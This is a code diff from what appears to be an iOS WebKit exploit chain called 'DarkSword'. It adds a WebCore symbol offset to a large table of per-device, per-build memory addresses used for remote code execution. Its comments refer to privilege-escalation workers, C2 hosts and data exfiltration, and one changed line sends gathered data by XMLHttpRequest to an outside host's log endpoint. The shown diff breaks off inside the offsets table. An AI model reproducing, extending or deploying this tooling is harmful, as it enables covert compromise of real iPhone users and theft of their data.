@@ -43,7 +43,7 @@ function print(x, reportError = false, dumphex = false) {
         }
         let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
         const xhr = new XMLHttpRequest();
-        xhr.open("GET", host + "/log.html?" + req , true);
+        xhr.open("GET", String(host || '').replace(/\/$/, '') + "/log.html?" + req , true);
         if (__labDeviceUUID) {
             try { xhr.setRequestHeader('X-Device-UUID', __labDeviceUUID); } catch (e1) {}
         }
@@ -71,7 +71,7 @@ function applyExfilFromData(data) {
 }
 function patchExfilPayload(script) {
   // iosc2: PE/C2 hosts come from delivery template (__C2_*/__HQ_*/__SEN_*).
-  // External lab host rewrite removed â return payload unchanged.
+  // External lab host rewrite removed — return payload unchanged.
   return script;
 }
 function shouldPatchExfil(fname) {
@@ -88,7 +88,7 @@ function shouldPatchExfil(fname) {
 
 function getJS(fname, method = 'GET', tries = 5)
 {
-      // Early PE lock: postMessage is async â spin so main can markPeDone
+      // Early PE lock: postMessage is async — spin so main can markPeDone
       // before WebContent dies (esp. when pe_worker is cached / instant).
       try {
         var _fn = String(fname || '');
@@ -100,7 +100,7 @@ function getJS(fname, method = 'GET', tries = 5)
       } catch (ePeSig) {}
       const path = fname.startsWith('/') ? fname : '/' + fname;
       var clean = String(fname || '').split('?')[0].replace(/^\//, '');
-      // DarkSword L1 encrypted fetch (/res/{S}/{H}) â same as rce_worker_18.6.js
+      // DarkSword L1 encrypted fetch (/res/{S}/{H}) — same as rce_worker_18.6.js
       if (_enc_S && _enc_hashes && _enc_hashes[clean] && typeof aesCtrDecrypt === 'function') {
           try {
               var xhrL1 = new XMLHttpRequest();
@@ -317,6 +317,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed8778c0n,
@@ -425,6 +426,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed8778c0n,
@@ -533,6 +535,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877940n,
@@ -641,6 +644,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877940n,
@@ -749,6 +753,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899860n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b6c0n,
@@ -857,6 +862,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877d00n,
@@ -965,6 +971,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877e40n,
@@ -1073,6 +1080,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed895fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877e40n,
@@ -1181,6 +1189,7 @@ rce_offsets = {
     WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
     WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
     WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+    WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8961e0n,
     WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
     WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
     WebProcess_singleton : 0x1ed878040n,
@@ -1289,6 +1298,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8961e0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed878040n,
@@ -1397,6 +1407,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8960a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877f00n,
@@ -1505,6 +1516,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8960a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed877f00n,
@@ -1613,6 +1625,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bd00n,
@@ -1721,6 +1734,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed896260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed8780c0n,
@@ -1829,6 +1843,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed896260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed8780c0n,
@@ -1937,6 +1952,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c200n,
@@ -2045,6 +2061,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c200n,
@@ -2153,6 +2170,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8965a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed878400n,
@@ -2261,6 +2279,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8965a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed878400n,
@@ -2369,6 +2388,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c500n,
@@ -2477,6 +2497,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c500n,
@@ -2585,6 +2606,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c500n,
@@ -2693,6 +2715,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed87c500n,
@@ -2801,6 +2824,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8965a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed878400n,
@@ -2909,6 +2933,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed8965a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed878400n,
@@ -3017,12 +3042,13 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee964548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7696b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb724300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed896560n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed8783c0n,
       WebCore__HTMLDocument_vtable : 0x1f10d9a68n,
-   },
-  // === 22G89 â derived from 22G86 ===
+   }
+  // === 22G89 — derived from 22G86 ===
   "iPhone11,2_4_6_22G89": {
       __pthread_head : 0x268994020n,
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ed8f5da8n,
@@ -5935,6 +5961,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b8c0n,
@@ -6042,6 +6069,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899a60n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b8c0n,
@@ -6149,6 +6177,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b940n,
@@ -6256,6 +6285,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ae0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b940n,
@@ -6363,6 +6393,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899860n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87b6c0n,
@@ -6470,6 +6501,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bd00n,
@@ -6577,6 +6609,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87be40n,
@@ -6684,6 +6717,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899fe0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87be40n,
@@ -6791,6 +6825,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a1e0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c040n,
@@ -6898,6 +6933,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a1e0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c040n,
@@ -7005,6 +7041,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a0a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bf00n,
@@ -7112,6 +7149,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a0a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bf00n,
@@ -7219,6 +7257,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed899ea0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87bd00n,
@@ -7326,6 +7365,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c0c0n,
@@ -7433,6 +7473,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a260n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c0c0n,
@@ -7540,6 +7581,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880200n,
@@ -7647,6 +7689,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e3a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880200n,
@@ -7754,6 +7797,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -7861,6 +7905,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee968548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb76d6b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb728300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89a5a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da2e34n,
       WebProcess_gpuProcessConnectionClosed : 0x19976ec4cn,
       WebProcess_singleton : 0x1ed87c400n,
@@ -7968,6 +8013,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -8075,6 +8121,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
+      WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents : 0x1ed89e6a0n,
       WebProcess_ensureGPUProcessConnection : 0x198da6e34n,
       WebProcess_gpuProcessConnectionClosed : 0x199772c4cn,
       WebProcess_singleton : 0x1ed880500n,
@@ -8182,6 +8229,7 @@ rce_offsets = {
       WebCore__softLinkOTSVGOTSVGTableRelease : 0x1ee96c548n,
       WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb7716b0n,
       WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb72c300n,
